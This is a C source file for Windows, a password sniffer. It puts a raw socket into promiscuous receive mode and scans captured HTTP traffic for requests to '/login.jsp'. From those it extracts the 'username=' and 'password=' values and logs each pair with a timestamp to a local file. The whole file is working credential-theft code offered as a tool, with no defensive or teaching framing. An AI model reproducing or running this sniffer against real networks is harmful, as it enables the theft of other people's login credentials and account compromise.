#include"PasswordSniffer.h"

char ActionPage[MAX_PATH] = "/login.jsp";
char UserColumn[MAX_PATH] = "username=";
char PasswordColumn[MAX_PATH] = "password=";
char OutputFile[MAX_PATH] = "logs.txt";

DWORD WINAPI StartSniffing(LPVOID lpParameter)
{
	SOCKET sniffer = (SOCKET)lpParameter;
	char Buffer[65536], * Tcp_Content;
	int mangobyte;
	IPV4_HDR* IP_HDR;
	TCP_HDR* Tcp_HDR;

	if (Buffer == NULL)
	{
		printf("malloc() failed.\n");
		return 0;
	}
	char account[0x1000], password[0x1000], cTime[0x1000], * ptr;
	time_t now;
	tm* tm;

	do
	{
		memset(Buffer, 0, 65536);
		mangobyte = recvfrom(sniffer, Buffer, 65536, 0, 0, 0);

		IP_HDR = (IPV4_HDR*)&Buffer[0];
		Tcp_HDR = (TCP_HDR*)&Buffer[sizeof(IPV4_HDR)];
		Tcp_Content = (char*)Buffer + sizeof(IPV4_HDR) + sizeof(TCP_HDR);

		if (strstr(Tcp_Content, ActionPage))
		{
			memset(account, 0, 0x1000);
			ptr = strstr(Tcp_Content, UserColumn);
			if (!ptr) {
				continue;
			}
			ptr += strlen(UserColumn);
			for (int n = 0; n < 0x1000; n++) {
				if (ptr[n] == '&')break;
				if (ptr[n] == '\n')break;
				if (ptr[n] == '\r')break;
				account[n] = ptr[n];
			}

			memset(password, 0, 0x1000);
			ptr = strstr(Tcp_Content, PasswordColumn);
			if (!ptr) {
				continue;
			}
			ptr += strlen(PasswordColumn);
			for (int n = 0; n < 0x1000; n++) {
				if (ptr[n] == '&')break;
				if (ptr[n] == '\n')break;
				if (ptr[n] == '\r')break;
				password[n] = ptr[n];
			}

			now = time(0);
			tm = localtime(&now);
			sprintf(cTime, "%04d/%02d/%02d %02d:%02d", tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday, tm->tm_hour, tm->tm_min);

			HANDLE hFile = CreateFileA(OutputFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			DWORD dwMoved = SetFilePointer(hFile, 0, 0, FILE_END);
			DWORD dwFileSize;
			char output[1000];
			memset(output, 0, 1000);
			sprintf(output, "%s\t%s\t%s", cTime, account, password);
			printf("%s\n", output);
			WriteFile(hFile, output, strlen(output), &dwFileSize, 0);
			WriteFile(hFile, "\r\n", 2, &dwFileSize, 0);
			CloseHandle(hFile);
		}

	} while (mangobyte > 0);

	free(Buffer);
	return 0;
}

int main(int argc, char** argv)
{
	SOCKET sniffer;
	struct in_addr addr;

	char hostname[100];
	struct hostent* local;
	WSADATA wsa;

	printf("\nInitialising Winsock...\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("WSAStartup() failed.\n");
		return 1;
	}
	printf("Creating RAW Socket...\n");
	sniffer = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	if (sniffer == INVALID_SOCKET)
	{
		printf("Failed to create raw socket.\n");
		return 1;
	}

	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
	{
		printf("Error : %d", WSAGetLastError());
		return 1;
	}
	printf("Host name : %s \n\n",hostname);

	local = gethostbyname(hostname);
	printf("Available Network Interfaces : \n");
	if (local == NULL)
	{
		printf("Error : %d.\n", WSAGetLastError());
		return 1;
	}


	for (int i = 0; local->h_addr_list[i] != 0; ++i)
	{
		memcpy(&addr, local->h_addr_list[i], sizeof(struct in_addr));
		printf("Interface Number : %d\tAddress : %s\n",i,inet_ntoa(addr));
		
		struct sockaddr_in dest;
		memset(&dest, 0, sizeof(dest));
		memcpy(&dest.sin_addr.s_addr, local->h_addr_list[i], sizeof(dest.sin_addr.s_addr));
		dest.sin_family = AF_INET;
		dest.sin_port = 80;

		printf("Binding socket to local system ...\n");
		if (bind(sniffer, (struct sockaddr*)&dest, sizeof(dest)) == SOCKET_ERROR)
		{
			printf("bind(%s) failed.\n", inet_ntoa(addr));
			continue;	
		}

		int j = 1;
		printf("Setting socket to sniff...\n");
		if (WSAIoctl(sniffer, SIO_RCVALL, &j, sizeof(j), 0, 0, (LPDWORD)&i, 0, 0) == SOCKET_ERROR)
		{
			printf("WSAIoctl() failed.\n");
			continue;
		}
		CreateThread(0, 0, StartSniffing, (LPVOID)sniffer, 0, 0);
	}
	printf("\nTime\t\t\tAccount\tPassword\n");
	while (1)Sleep(360000);
	WSACleanup();

	return 0;
}